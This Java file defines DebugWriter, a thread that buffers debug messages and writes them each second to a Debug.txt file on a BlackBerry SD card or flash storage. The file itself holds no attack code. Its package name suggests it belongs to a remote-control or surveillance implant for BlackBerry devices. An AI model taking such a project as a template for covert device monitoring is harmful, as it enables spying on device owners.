package com.ht.rcs.blackberry.utils;

import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.fs.Path;

public final class DebugWriter extends Thread {

    static final String FILE_NAME = "Debug.txt";
    static final String SD_PATH = Path.SD_PATH + FILE_NAME;
    static final String FLASH_PATH = Path.USER_PATH + FILE_NAME;
    private static final long SLEEP_TIME = 1000;

    private static AutoFlashFile fileDebug;

    boolean toStop;

    StringBuffer queue;
    int numMessages;

    public DebugWriter(boolean logToSD) {

        toStop = false;
        queue = new StringBuffer();
        
        boolean logToFlash = !logToSD;

        if (logToSD) {
            Path.createDirectory(Path.SD_PATH);
            fileDebug = new AutoFlashFile(SD_PATH, false);
        } else {
            Path.createDirectory(Path.USER_PATH);
            fileDebug = new AutoFlashFile(FLASH_PATH, false);
        }

        if (!fileDebug.exists()) {
            fileDebug.create();
        }
        if (fileDebug.exists()) {
            fileDebug.delete();
        }
        fileDebug.create();

    }

    public void run() {
        // #ifdef DBC
        Check.asserts(fileDebug != null, "null filedebug");
        // #endif

        for(;;) {
            synchronized (this) {
                if (numMessages > 0) {
                    String message = queue.toString();
                    boolean ret = fileDebug.append(message + "\r\n");
                    queue = new StringBuffer();
                    numMessages = 0;
                }

                if(toStop){
                    break;
                }
                
                try {
                    wait(SLEEP_TIME);
                } catch (InterruptedException e) {
                }
            }
            //Utils.sleep((int) SLEEP_TIME);
        }
    }

    public synchronized void stop() {
        toStop = true;
        notifyAll();
    }

    public synchronized boolean append(String message) {

        queue.append(message + "\r\n");
        numMessages++;

        return true;
    }
}
